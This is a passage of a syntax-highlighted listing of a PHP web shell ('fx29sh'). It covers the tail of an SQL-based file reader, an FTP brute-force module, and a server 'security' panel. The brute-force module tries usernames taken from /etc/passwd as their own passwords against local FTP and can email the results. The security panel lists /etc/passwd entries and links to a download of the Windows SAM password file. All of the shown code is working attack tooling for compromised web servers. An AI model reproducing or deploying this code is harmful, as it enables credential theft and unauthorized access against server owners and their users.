<span class="lineno">1042</span>                <span class="k">else</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;File </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$sql_getfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">:&lt;/b&gt;&lt;br&gt;&quot;</span><span class="o">.</span><span class="nb">nl2br</span><span class="p">(</span><span class="nb">htmlspecialchars</span><span class="p">(</span><span class="nv">$f</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;}</span>
<span class="lineno">1043</span>                <span class="nb">mysql_free_result</span><span class="p">(</span><span class="nv">$result</span><span class="p">);</span>
<span class="lineno">1044</span>                <span class="nb">mysql_query</span><span class="p">(</span><span class="s2">&quot;DROP TABLE tmp_file;&quot;</span><span class="p">);</span>
<span class="lineno">1045</span>              <span class="p">}</span>
<span class="lineno">1046</span>            <span class="p">}</span>
<span class="lineno">1047</span>            <span class="nb">mysql_drop_db</span><span class="p">(</span><span class="nv">$tmpdb</span><span class="p">);</span>
<span class="lineno">1048</span>          <span class="p">}</span>
<span class="lineno">1049</span>        <span class="p">}</span>
<span class="lineno">1050</span>      <span class="p">}</span>
<span class="lineno">1051</span>     <span class="p">}</span>
<span class="lineno">1052</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1053</span> 
<span class="lineno">1054</span> 
<span class="lineno">1055</span> <span class="x">    &lt;/td&gt;</span>
<span class="lineno">1056</span> <span class="x">    &lt;/tr&gt;</span>
<span class="lineno">1057</span> <span class="cp">&lt;?php</span>
<span class="lineno">1058</span>     <span class="k">if</span> <span class="p">(</span><span class="nv">$sql_sock</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1059</span>       <span class="nv">$affected</span> <span class="o">=</span> <span class="o">@</span><span class="nb">mysql_affected_rows</span><span class="p">(</span><span class="nv">$sql_sock</span><span class="p">);</span>
<span class="lineno">1060</span>       <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$affected</span><span class="p">))</span> <span class="k">or</span> <span class="p">(</span><span class="nv">$affected</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$affected</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1061</span>       <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;tr&gt;&lt;th colspan=2&gt;Affected rows: </span><span class="si">$affected</span><span class="s2">&lt;/th&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1062</span>     <span class="p">}</span>
<span class="lineno">1063</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1064</span> <span class="x">&lt;/table&gt;</span>
<span class="lineno">1065</span> <span class="x">&lt;!-- End of SQL Manager --&gt;</span>
<span class="lineno">1066</span> <span class="cp">&lt;?php</span>
<span class="lineno">1067</span>   <span class="p">}</span>
<span class="lineno">1068</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;ftpquickbrute&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1069</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;table&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1070</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td class=</span><span class="se">\&quot;</span><span class="s2">barheader</span><span class="se">\&quot;</span><span class="s2"> colspan=2&gt;.: Ftp Quick Brute :.&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1071</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1072</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="k">empty</span><span class="p">(</span><span class="nv">$submit</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1073</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$fqb_lenght</span><span class="p">))</span> <span class="p">{</span><span class="nv">$fqb_lenght</span> <span class="o">=</span> <span class="nv">$nixpwdperpage</span><span class="p">;}</span>
<span class="lineno">1074</span>       <span class="nv">$fp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="s2">&quot;/etc/passwd&quot;</span><span class="p">,</span><span class="s2">&quot;r&quot;</span><span class="p">);</span>
<span class="lineno">1075</span>       <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nv">$fp</span><span class="p">)</span> <span class="p">{</span><span class="k">echo</span> <span class="s2">&quot;Can&#39;t get /etc/passwd for password-list.&quot;</span><span class="p">;}</span>
<span class="lineno">1076</span>       <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1077</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logging</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1078</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">)</span> <span class="p">{</span><span class="nv">$fqb_logfp</span> <span class="o">=</span> <span class="nb">fopen</span><span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">,</span><span class="s2">&quot;w&quot;</span><span class="p">);}</span>
<span class="lineno">1079</span>           <span class="k">else</span> <span class="p">{</span><span class="nv">$fqb_logfp</span> <span class="o">=</span> <span class="k">FALSE</span><span class="p">;}</span>
<span class="lineno">1080</span>           <span class="nv">$fqb_log</span> <span class="o">=</span> <span class="s2">&quot;FTP Quick Brute (&quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot;) started at &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1081</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfile</span><span class="p">)</span> <span class="p">{</span><span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
<span class="lineno">1082</span>         <span class="p">}</span>
<span class="lineno">1083</span>         <span class="o">@</span><span class="nb">ob_flush</span><span class="p">();</span>
<span class="lineno">1084</span>         <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$success</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
<span class="lineno">1085</span>         <span class="nv">$ftpquick_st</span> <span class="o">=</span> <span class="nx">getmicrotime</span><span class="p">();</span>
<span class="lineno">1086</span>         <span class="k">while</span><span class="p">(</span><span class="o">!</span><span class="nb">feof</span><span class="p">(</span><span class="nv">$fp</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1087</span>           <span class="nv">$str</span> <span class="o">=</span> <span class="nb">explode</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nb">fgets</span><span class="p">(</span><span class="nv">$fp</span><span class="p">,</span><span class="mi">2048</span><span class="p">));</span>
<span class="lineno">1088</span>           <span class="k">if</span> <span class="p">(</span><span class="nx">fx29ftpbrutecheck</span><span class="p">(</span><span class="s2">&quot;localhost&quot;</span><span class="p">,</span><span class="mi">21</span><span class="p">,</span><span class="mi">1</span><span class="p">,</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">],</span><span class="nv">$str</span><span class="p">[</span><span class="mi">6</span><span class="p">],</span><span class="nv">$fqb_onlywithsh</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1089</span>             <span class="k">echo</span> <span class="s2">&quot;&lt;b&gt;Connected to &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&lt;/b&gt;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1090</span>             <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;Connected to &quot;</span><span class="o">.</span><span class="nb">getenv</span><span class="p">(</span><span class="s2">&quot;SERVER_NAME&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot; with login </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> and password </span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$str</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">, at &quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y H:i:s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1091</span>             <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">)</span> <span class="p">{</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
<span class="lineno">1092</span>             <span class="nv">$success</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">1093</span>             <span class="nb">ob_flush</span><span class="p">();</span>
<span class="lineno">1094</span>           <span class="p">}</span>
<span class="lineno">1095</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&gt;</span> <span class="nv">$fqb_lenght</span><span class="p">)</span> <span class="p">{</span><span class="k">break</span><span class="p">;}</span>
<span class="lineno">1096</span>           <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">1097</span>         <span class="p">}</span>
<span class="lineno">1098</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$success</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;No success. connections!&quot;</span><span class="p">;</span> <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;No success. connections!</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1099</span>         <span class="nv">$ftpquick_t</span> <span class="o">=</span> <span class="nb">round</span><span class="p">(</span><span class="nx">getmicrotime</span><span class="p">()</span><span class="o">-</span><span class="nv">$ftpquick_st</span><span class="p">,</span><span class="mi">4</span><span class="p">);</span>
<span class="lineno">1100</span>         <span class="k">echo</span> <span class="s2">&quot;&lt;hr size=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> noshade&gt;&lt;b&gt;Done!&lt;/b&gt;&lt;br&gt;Total time (secs.): &quot;</span><span class="o">.</span><span class="nv">$ftpquick_t</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;Total connections: &quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;Success.: &lt;font class=on&gt;&lt;b&gt;&quot;</span><span class="o">.</span><span class="nv">$success</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;/font&gt;&lt;br&gt;Unsuccess.:&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">-</span><span class="nv">$success</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;/b&gt;&lt;br&gt;Connects per second: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="nv">$ftpquick_t</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1101</span>         <span class="nv">$fqb_log</span> <span class="o">.=</span> <span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">------------------------------------------</span><span class="se">\r\n</span><span class="s2">Done!</span><span class="se">\r\n</span><span class="s2">Total time (secs.): &quot;</span><span class="o">.</span><span class="nv">$ftpquick_t</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Total connections: &quot;</span><span class="o">.</span><span class="nv">$i</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Success.: &quot;</span><span class="o">.</span><span class="nv">$success</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Unsuccess.:&quot;</span><span class="o">.</span><span class="p">(</span><span class="nv">$i</span><span class="o">-</span><span class="nv">$success</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">Connects per second: &quot;</span><span class="o">.</span><span class="nb">round</span><span class="p">(</span><span class="nv">$i</span><span class="o">/</span><span class="nv">$ftpquick_t</span><span class="p">,</span><span class="mi">2</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\r\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1102</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">)</span> <span class="p">{</span><span class="nb">fseek</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="mi">0</span><span class="p">);</span> <span class="nb">fwrite</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">,</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$fqb_log</span><span class="p">));}</span>
<span class="lineno">1103</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$fqb_logemail</span><span class="p">)</span> <span class="p">{</span><span class="o">@</span><span class="nb">mail</span><span class="p">(</span><span class="nv">$fqb_logemail</span><span class="p">,</span><span class="s2">&quot;&quot;</span><span class="o">.</span><span class="nx">sh_name</span><span class="p">()</span><span class="o">.</span><span class="s2">&quot; report&quot;</span><span class="p">,</span><span class="nv">$fqb_log</span><span class="p">);}</span>
<span class="lineno">1104</span>         <span class="nb">fclose</span><span class="p">(</span><span class="nv">$fqb_logfp</span><span class="p">);</span>
<span class="lineno">1105</span>       <span class="p">}</span>
<span class="lineno">1106</span>     <span class="p">}</span>
<span class="lineno">1107</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1108</span>       <span class="nv">$logfile</span> <span class="o">=</span> <span class="nv">$tmp_dir</span><span class="o">.</span><span class="s2">&quot;fx29sh_ftpquickbrute_&quot;</span><span class="o">.</span><span class="nb">date</span><span class="p">(</span><span class="s2">&quot;d.m.Y_H_i_s&quot;</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;.log&quot;</span><span class="p">;</span>
<span class="lineno">1109</span>       <span class="nv">$logfile</span> <span class="o">=</span> <span class="nb">str_replace</span><span class="p">(</span><span class="s2">&quot;//&quot;</span><span class="p">,</span><span class="nx">DIRECTORY_SEPARATOR</span><span class="p">,</span><span class="nv">$logfile</span><span class="p">);</span>
<span class="lineno">1110</span>       <span class="k">echo</span> <span class="s2">&quot;&lt;form name=</span><span class="se">\&quot;</span><span class="s2">f_ftpqb</span><span class="se">\&quot;</span><span class="s2"> action=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1111</span>              <span class="s2">&quot;&lt;input type=hidden name=act value=</span><span class="se">\&quot;</span><span class="s2">ftpquickbrute</span><span class="se">\&quot;</span><span class="s2">&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="o">.</span>
<span class="lineno">1112</span>            <span class="s2">&quot;Read first:&lt;/td&gt;&lt;td&gt;&lt;input type=text name=</span><span class="se">\&quot;</span><span class="s2">fqb_lenght</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$nixpwdperpage</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="o">.</span>
<span class="lineno">1113</span>            <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_onlywithsh</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2">&gt; Users only with shell&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="o">.</span>
<span class="lineno">1114</span>            <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;&lt;/td&gt;&lt;td&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">checkbox</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logging</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">1</span><span class="se">\&quot;</span><span class="s2"> checked&gt;Logging&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="o">.</span>
<span class="lineno">1115</span>            <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;Logging to file:&lt;/td&gt;&lt;td&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logfile</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$logfile</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logfile</span><span class="p">)</span><span class="o">/</span><span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="o">.</span>
<span class="lineno">1116</span>            <span class="s2">&quot;&lt;tr&gt;&lt;td&gt;Logging to e-mail:&lt;/td&gt;&lt;td&gt;&lt;input type=</span><span class="se">\&quot;</span><span class="s2">text</span><span class="se">\&quot;</span><span class="s2"> name=</span><span class="se">\&quot;</span><span class="s2">fqb_logemail</span><span class="se">\&quot;</span><span class="s2"> value=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$log_email</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2"> size=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logemail</span><span class="p">)</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="p">(</span><span class="nb">strlen</span><span class="p">(</span><span class="nv">$logemail</span><span class="p">)</span><span class="o">/</span><span class="mi">10</span><span class="p">))</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/td&gt;&lt;/tr&gt;&quot;</span><span class="o">.</span>
<span class="lineno">1117</span>            <span class="s2">&quot;&lt;tr&gt;&lt;td colspan=2&gt;&lt;input type=submit name=submit value=</span><span class="se">\&quot;</span><span class="s2">Brute</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;/form&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1118</span>     <span class="p">}</span>
<span class="lineno">1119</span>     <span class="k">echo</span> <span class="s2">&quot;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/center&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1120</span>   <span class="p">}</span>
<span class="lineno">1121</span>   <span class="c1">###[ SECURITY ]###</span>
<span class="lineno">1122</span>   <span class="k">if</span> <span class="p">(</span><span class="nv">$act</span> <span class="o">==</span> <span class="s2">&quot;security&quot;</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1123</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1124</span> 
<span class="lineno">1125</span> 
<span class="lineno">1126</span> <span class="x">&lt;div class=barheader&gt;.: Server Security Information :.&lt;/div&gt;</span>
<span class="lineno">1127</span> <span class="x">&lt;table class=&quot;contents&quot;&gt;</span>
<span class="lineno">1128</span> <span class="x">    &lt;tr&gt;&lt;td&gt;Open Base Dir&lt;/td&gt;&lt;td&gt;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$hopenbasedir</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1129</span> <span class="x">    &lt;td&gt;Password File&lt;/td&gt;&lt;td&gt;</span>
<span class="lineno">1130</span> <span class="cp">&lt;?php</span>
<span class="lineno">1131</span>     <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">is_windows</span><span class="p">())</span> <span class="p">{</span>
<span class="lineno">1132</span>       <span class="k">if</span> <span class="p">(</span><span class="nv">$nixpasswd</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1133</span>         <span class="k">if</span> <span class="p">(</span><span class="nv">$nixpasswd</span> <span class="o">==</span> <span class="mi">1</span><span class="p">)</span> <span class="p">{</span> <span class="nv">$nixpasswd</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1134</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$nixpwd_s</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$nixpwd_s</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1135</span>         <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nb">is_numeric</span><span class="p">(</span><span class="nv">$nixpwd_e</span><span class="p">))</span> <span class="p">{</span> <span class="nv">$nixpwd_e</span> <span class="o">=</span> <span class="nv">$nixpwdperpage</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1136</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1137</span> 
<span class="lineno">1138</span> 
<span class="lineno">1139</span> <span class="x">    *nix /etc/passwd:&lt;br&gt;</span>
<span class="lineno">1140</span> <span class="x">    &lt;form name=&quot;f_pwd&quot; action=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$surl</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">1141</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;act&quot; value=&quot;security&quot;&gt;</span>
<span class="lineno">1142</span> <span class="x">        &lt;input type=&quot;hidden&quot; name=&quot;nixpasswd&quot; value=&quot;1&quot;&gt;</span>
<span class="lineno">1143</span> <span class="x">        &lt;b&gt;From:&lt;/b&gt;</span>
<span class="lineno">1144</span> <span class="x">        &lt;input type=&quot;text&quot; name=&quot;nixpwd_s&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="k">echo</span> <span class="nv">$nixpwd_s</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">1145</span> <span class="x">        &lt;b&gt;To:&lt;/b&gt;</span>
<span class="lineno">1146</span> <span class="x">        &lt;input type=&quot;text&quot; name=&quot;nixpwd_e&quot; value=&quot;</span><span class="cp">&lt;?php</span> <span class="nv">$nixpwd_e</span><span class="p">;</span> <span class="cp">?&gt;</span><span class="x">&quot;&gt;</span>
<span class="lineno">1147</span> <span class="x">        &lt;input type=&quot;submit&quot; value=&quot;View&quot;&gt;</span>
<span class="lineno">1148</span> <span class="x">    &lt;/form&gt;&lt;br&gt;</span>
<span class="lineno">1149</span> <span class="cp">&lt;?php</span>
<span class="lineno">1150</span>         <span class="nv">$i</span> <span class="o">=</span> <span class="nv">$nixpwd_s</span><span class="p">;</span>
<span class="lineno">1151</span>         <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">&lt;</span> <span class="nv">$nixpwd_e</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1152</span>           <span class="nv">$uid</span> <span class="o">=</span> <span class="nb">posix_getpwuid</span><span class="p">(</span><span class="nv">$i</span><span class="p">);</span>
<span class="lineno">1153</span>           <span class="k">if</span> <span class="p">(</span><span class="nv">$uid</span><span class="p">)</span> <span class="p">{</span>
<span class="lineno">1154</span>             <span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">]</span> <span class="o">=</span> <span class="s2">&quot;&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=ls&amp;d=&quot;</span><span class="o">.</span><span class="nb">urlencode</span><span class="p">(</span><span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">])</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&quot;</span><span class="o">.</span><span class="nv">$uid</span><span class="p">[</span><span class="s2">&quot;dir&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;&lt;/a&gt;&quot;</span><span class="p">;</span>
<span class="lineno">1155</span>             <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t\t</span><span class="s2">&quot;</span><span class="o">.</span><span class="nb">join</span><span class="p">(</span><span class="s2">&quot;:&quot;</span><span class="p">,</span><span class="nv">$uid</span><span class="p">)</span><span class="o">.</span><span class="s2">&quot;&lt;br&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1156</span>           <span class="p">}</span>
<span class="lineno">1157</span>           <span class="nv">$i</span><span class="o">++</span><span class="p">;</span>
<span class="lineno">1158</span>         <span class="p">}</span>
<span class="lineno">1159</span>       <span class="p">}</span>
<span class="lineno">1160</span>       <span class="k">else</span> <span class="p">{</span> <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=security&amp;nixpasswd=1&amp;d=&quot;</span><span class="o">.</span><span class="nv">$ud</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;View /etc/passwd&lt;/b&gt;&lt;/a&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span> <span class="p">}</span>
<span class="lineno">1161</span>     <span class="p">}</span>
<span class="lineno">1162</span>     <span class="k">else</span> <span class="p">{</span>
<span class="lineno">1163</span>       <span class="nv">$v</span> <span class="o">=</span> <span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s1">&#39;\repair\sam&#39;</span><span class="p">;</span>
<span class="lineno">1164</span>       <span class="k">if</span> <span class="p">(</span><span class="nb">file_get_contents</span><span class="p">(</span><span class="nv">$v</span><span class="p">))</span> <span class="p">{</span>
<span class="lineno">1165</span>         <span class="k">echo</span> <span class="s2">&quot;</span><span class="se">\t</span><span class="s2">&lt;a href=</span><span class="se">\&quot;</span><span class="s2">&quot;</span><span class="o">.</span><span class="nv">$surl</span><span class="o">.</span><span class="s2">&quot;act=f&amp;f=sam&amp;d=&quot;</span><span class="o">.</span><span class="nv">$_SERVER</span><span class="p">[</span><span class="s2">&quot;WINDIR&quot;</span><span class="p">]</span><span class="o">.</span><span class="s2">&quot;</span><span class="se">\\</span><span class="s2">repair&amp;ft=download</span><span class="se">\&quot;</span><span class="s2">&gt;&lt;b&gt;Download password file&lt;/b&gt;&lt;/a&gt;</span><span class="se">\n</span><span class="s2">&quot;</span><span class="p">;</span>
<span class="lineno">1166</span>       <span class="p">}</span>
<span class="lineno">1167</span>     <span class="p">}</span>
<span class="lineno">1168</span> <span class="cp">?&gt;</span><span class="x"></span>
<span class="lineno">1169</span> 
<span class="lineno">1170</span> 
<span class="lineno">1171</span> <span class="x">    &lt;/td&gt;&lt;/tr&gt;</span>
<span class="lineno">1172</span> <span class="x">    &lt;tr&gt;&lt;td&gt;Config Files&lt;/td&gt;&lt;td&gt;</span>
<span class="lineno">1173</span> <span class="cp">&lt;?php</span>
